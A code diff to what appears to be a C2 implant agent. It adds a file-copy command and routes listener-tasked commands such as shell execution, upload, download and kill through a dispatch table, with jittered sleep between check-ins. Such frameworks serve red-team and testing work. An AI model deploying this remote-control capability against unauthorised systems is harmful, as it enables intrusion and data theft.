@@ -6,6 +6,7 @@ import logging
 import os
 import platform
 import random
+import shutil
 import socket
 import subprocess
 import time
@@ -121,7 +122,7 @@ def shell_capability(task_id, arguments, connection):
     )
 
 
-def ping_capability(task_id, connection):
+def ping_capability(task_id, arguments, connection):
     connection.post_results_to_listener(
         task_id=task_id,
         success=True,
@@ -152,7 +153,7 @@ def disconnect_capability(task_id, arguments, connection):
     return True  # Signal to disconnect
 
 
-def kill_capability(task_id, connection):
+def kill_capability(task_id, arguments, connection):
     connection.post_results_to_listener(
         task_id=task_id,
         success=True,
@@ -386,6 +387,65 @@ def ls_capability(task_id, arguments, connection):
         task_id=task_id,
         success=True,
         message=f"Contents of directory '{path}': {entries}",
+    )
+
+
+def cp_capability(task_id, arguments, connection):
+    source = arguments["source"]
+    destination = arguments["destination"]
+    recursive = arguments["recursive"]
+    expand = arguments["expand"]
+    overwrite = arguments["overwrite"]
+
+    if expand:
+        source = os.path.expandvars(source)
+        destination = os.path.expandvars(destination)
+    if os.path.exists(destination) and not overwrite:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Failed to copy. Path '{destination}' already exists.",
+        )
+        return
+
+    try:
+        if os.path.isdir(source):
+            if recursive:
+                shutil.copytree(source, destination)
+            else:
+                connection.post_results_to_listener(
+                    task_id=task_id,
+                    success=False,
+                    message=(
+                        f"Failed to copy. Source '{source}' is a directory and the "
+                        f"recursive option is not set."
+                    ),
+                )
+                return
+        else:
+            shutil.copy2(source, destination)
+    except FileNotFoundError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Failed to copy. Source '{source}' does not exist.",
+        )
+        return
+    except PermissionError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=(
+                f"Failed to copy. Permission denied for source '{source}' or "
+                f"destination '{destination}'."
+            ),
+        )
+        return
+
+    connection.post_results_to_listener(
+        task_id=task_id,
+        success=True,
+        message=f"Copied {source} to '{destination}'.",
     )
 
 
@@ -661,6 +721,20 @@ class Agent:
     ):
         self.connection = connection
         self.module_loader = module_loader
+        self.capability_dispatch = {
+            "shell": shell_capability,
+            "sleep": sleep_capability,
+            "delay": delay_capability,
+            "download": download_capability,
+            "upload": upload_capability,
+            "cat": cat_capability,
+            "cp": cp_capability,
+            "cd": cd_capability,
+            "ls": ls_capability,
+            "pwd": pwd_capability,
+            "ping": ping_capability,
+            "kill": kill_capability,
+        }
 
     def _sleep(self):
         jitter_range = self.connection.sleep_time * self.connection.sleep_time_jitter
@@ -735,16 +809,8 @@ class Agent:
                         command = task["command"]
                         arguments = task["arguments"]
 
-                        if command == "shell":
-                            shell_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "ping":
-                            ping_capability(task_id=task_id, connection=self.connection)
-                        elif command == "sleep":
-                            sleep_capability(
+                        if command in self.capability_dispatch:
+                            self.capability_dispatch[command](
                                 task_id=task_id,
                                 arguments=arguments,
                                 connection=self.connection,
@@ -757,50 +823,6 @@ class Agent:
                             )
                             if disconnect:
                                 break
-                        elif command == "kill":
-                            kill_capability(task_id=task_id, connection=self.connection)
-                        elif command == "delay":
-                            delay_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "download":
-                            download_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "upload":
-                            upload_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "cat":
-                            cat_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "cd":
-                            cd_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "pwd":
-                            pwd_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
-                        elif command == "ls":
-                            ls_capability(
-                                task_id=task_id,
-                                arguments=arguments,
-                                connection=self.connection,
-                            )
                         else:
                             module_name = command
                             try:
